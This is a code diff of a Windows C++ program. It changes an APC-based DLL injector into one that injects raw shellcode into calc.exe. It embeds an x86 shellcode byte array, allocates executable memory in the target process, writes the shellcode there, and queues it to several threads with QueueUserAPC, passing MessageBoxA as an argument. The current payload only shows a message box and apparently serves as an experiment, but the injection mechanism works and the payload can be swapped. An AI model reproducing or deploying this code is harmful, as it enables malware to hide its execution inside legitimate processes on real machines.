@@ -2,8 +2,14 @@
 #include <TlHelp32.h>
 #include <vector>
 #include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
+
+#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib
 
 using namespace std;
+
+byte executer[] = {"\x55\x89\xE5\x83\xEC\x0C\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x8B\x45\x08\x8B\x08\x89\x4D\xF4\x50\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x83\xC4\x10\x58\x31\xC0\x89\xEC\x5D\xC3"};
 
 bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
     auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
@@ -39,11 +45,8 @@ void main()
 {
 	DWORD pid;
 	vector<DWORD> tids;
-	const char buffer[] = "injectDll.dll";
-	char lpdllpath[MAX_PATH];
-	GetFullPathName(buffer, MAX_PATH, lpdllpath, nullptr);
-	auto size = strlen(lpdllpath)*sizeof(TCHAR);
-	cout<<"[i] full path: "<<lpdllpath<<endl;
+	LPVOID exe = executer;
+	ULONG size = sizeof(executer);
 
 	if (FindProcess("calc.exe", pid, tids)) {
 		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
@@ -51,28 +54,44 @@ void main()
 			cout<<"[!] failed to get handle for process: "<<pid<<endl;
 			return;
 		}
-		auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		// auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if(p==NULL) {
 			cout<<"[!] memory allocation failed!"<<endl;
 			return ;
 		}else{cout<<"[+] virtual mem allocation success"<<endl;}
-		cout<<"[i] allocated memory address: "<<p<<endl;
+		unsigned long injectedFn = (unsigned long)p;
+		// injectedFn = injectedFn+0x14;
+		cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;
 
-		if(::WriteProcessMemory(hProcess, p, lpdllpath, size, nullptr)==0){
+		if(::WriteProcessMemory(hProcess, p, exe, size, nullptr)==0){
 			DWORD err = GetLastError();
 			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
 			return ;
 		}else{cout<<"[+] write to process success"<<endl;}
+		cout<<"[+] Sleeping for 11s"<<endl;
+		Sleep(11000);
 
-		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<5; i++) {
+		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<4; i++) {
 			DWORD tid = tids[i];
-			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
+			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
 			cout<<endl;
+			HMODULE hModule = LoadLibrary("User32.dll");
+			if(hModule==NULL){
+				cout<<"[!] Failed to get handle to module"<<endl;
+				return;
+			}
+			ULONG_PTR messageBoxAddr = (ULONG_PTR)GetProcAddress(hModule, "MessageBoxA");
+			if(messageBoxAddr==NULL){
+				cout<<"[!] failed to get MessageBox addr! error: "<<GetLastError()<<endl;
+				return;
+			}
+			cout<<"MessageBox addr: 0x"<<hex<<messageBoxAddr<<dec<<endl;
 			if (hThread!=NULL) {
 				if(::QueueUserAPC(
-					(PAPCFUNC)::GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"),
+					(PAPCFUNC)p,
 					hThread, 
-					(ULONG_PTR)p)==0){
+					messageBoxAddr)==0){
 					cout<<"[!] failed to queue user apc"<<endl;
 				}
 				else{
